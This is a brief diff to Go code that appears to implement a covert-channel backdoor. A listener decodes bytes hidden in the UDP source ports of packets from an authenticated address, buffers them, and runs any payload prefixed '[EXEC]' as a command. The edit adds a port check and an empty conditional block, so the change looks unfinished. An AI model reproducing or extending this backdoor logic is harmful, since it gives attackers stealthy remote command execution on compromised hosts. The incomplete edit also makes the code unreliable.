@@ -170,13 +170,17 @@ func beginListen(ip string, port, lport uint16) {
 				buffer.Reset()
 			}
 		} else {
-			if incomingIP == authenticatedAddr {
+			if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == lport {
 				
 				err = binary.Write(buffer, binary.BigEndian, MAX_PORT - uint16(udpLayer.SrcPort))
 				checkError(err)
-		
-			} else if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == SND_CMPLETE{
+				
+				if(uint16(udpLayer.DstPort) == SND_CMPLETE){
 
+				
+				}
+
+			} else if incomingIP == authenticatedAddr && uint16(udpLayer.DstPort) == SND_CMPLETE {
 				strData := buffer.String()
 				if strings.HasPrefix(strData, "[EXEC]") {
 					executeCommand(strData, incomingIP, port);
